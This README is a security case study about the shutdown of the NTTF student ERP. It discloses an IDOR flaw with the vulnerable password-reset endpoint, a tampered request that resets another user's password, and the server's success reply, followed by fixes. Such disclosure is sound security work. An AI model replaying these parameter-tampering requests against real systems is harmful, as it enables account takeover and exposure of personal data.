<div align="center">

# 🔴 NTTF ERP — Shutdown Case Study

**Why `erp.nttftrg.com` was permanently taken offline**

![Status](https://img.shields.io/badge/erp.nttftrg.com-OFFLINE-red?style=flat-square)
![Type](https://img.shields.io/badge/Vulnerability-IDOR-orange?style=flat-square)
![Disclosed By](https://img.shields.io/badge/Disclosed%20By-Gaurav%20Kumar%20Kalindi-blue?style=flat-square)
![Date](https://img.shields.io/badge/Date-March%202026-lightgrey?style=flat-square)

</div>

---

## 📌 What Happened?

If you are searching for **why NTTF ERP is down** or why **erp.nttftrg.com** is permanently closed — this is the answer.

The NTTF Student Management ERP ran for **10 years** powered by ConceptWaves. In early 2026, the old URL displayed a closure notice and the system went permanently offline. While the contract between NTTF and ConceptWaves had concluded, a **critical security vulnerability** had also been discovered and disclosed in the system just before the shutdown.

> *"The system had a fundamental flaw — any logged-in user could reset the password of any other account, including admin accounts, just by changing one parameter in the API request."*
> — Gaurav Kumar Kalindi, Researcher

---

## 🕐 Timeline

| Date | Event |
|------|-------|
| 2015–2025 | NTTF ERP runs on erp.nttftrg.com for 10 years |
| March 2026 | Critical IDOR vulnerability discovered in the iLearn portal |
| March 19, 2026 | Vulnerability confirmed using Burp Suite. Full disclosure report prepared. |
| April 2026 | NTTF notified. New ERP system announced as replacement. |
| April 3, 2026 | Old ERP permanently shut down. Closure notice posted by ConceptWaves. |

---

## 🔒 Vulnerabilities Found

### 1. 🔴 IDOR — Account Takeover (Critical)
The password reset API accepted the target **username as a client-supplied parameter** with no server-side session validation. By intercepting the request and changing the username, any user could reset the password of **any other account** — student, faculty, or admin.

### 2. 🔴 No Server-Side Authorization (Critical)
The OTP used for password reset was **not tied to the session**. The server never verified that the OTP belonged to the account being modified.

### 3. 🟠 Full Student Data Exposure (High)
Personal details of all students were accessible and modifiable by any authenticated user via manipulated API object references.

### 4. 🟠 Exam MCQ Leaked Before Launch (High)
Due to the same IDOR flaw, exam MCQ content could be accessed before the exam was officially launched for a user.

### 5. 🟠 Date of Birth Auth Bypass (High)
Leaving the DOB field blank during login bypassed that authentication check entirely.

### 6. 🟠 No Brute-Force / Rate Limit Protection (High)
No lockout or rate limiting existed on login or OTP endpoints — allowing unlimited guessing attempts.

---

## 🛠️ How the IDOR Attack Worked

**Vulnerable endpoint:**
```
POST /rest/mobile/ilearn/password/reset HTTP/1.1
Host: erp.nttftrg.com
```

**Original (legitimate) request body:**
```json
{
  "userName": "BNTC2322026",
  "newPassword": "@MyPassword",
  "confirmPassword": "@MyPassword"
}
```

**Modified (attack) request — just change the username:**
```json
{
  "userName": "ANY_OTHER_USERNAME",
  "newPassword": "@AttackerPass",
  "confirmPassword": "@AttackerPass"
}
```

**Server response — HTTP 200 OK:**
```json
{
  "status": 1,
  "message": "Password reset done successfully.",
  "data": []
}
```

The server **accepted the change without any authorization check.** The attacker's own OTP was used, but the password was changed for a completely different account.

---

## 🧰 Tool Used

- **Burp Suite Community Edition** — for intercepting and replaying API requests

---

## ✅ Recommended Fixes

1. **Token-based sessions** — Never accept username as a parameter for sensitive operations. Derive identity from the server-side session only.
2. **OTP-to-session binding** — OTP must be validated against the session, not the submitted username field.
3. **Rate limiting** — Implement lockout and exponential backoff on all auth endpoints.
4. **Authorization on every endpoint** — Every API call must verify the requesting user owns the requested resource.

---

## ❓ Is NTTF ERP Permanently Closed?

**Yes.** `erp.nttftrg.com` is permanently offline. The 10-year contract between NTTF and ConceptWaves has ended. NTTF has moved to a new ERP system.

---

## 👤 Researcher

**Gaurav Kumar Kalindi**
Passout Student · NTTF BNTC Branch · Roll No: `BNTC2322026`

📧 gauravkumarkalindi@outlook.com
📞 8340626058

> This is a responsible disclosure. All testing was done ethically. The account used for demonstration belonged to a passed-out student and permission was taken prior to testing.

---

<div align="center">

**Keywords:** NTTF ERP down · erp.nttftrg.com closed · NTTF ilearn shutdown · IDOR vulnerability NTTF · Nettur Technical Training Foundation ERP · NTTF student management system closed

</div>
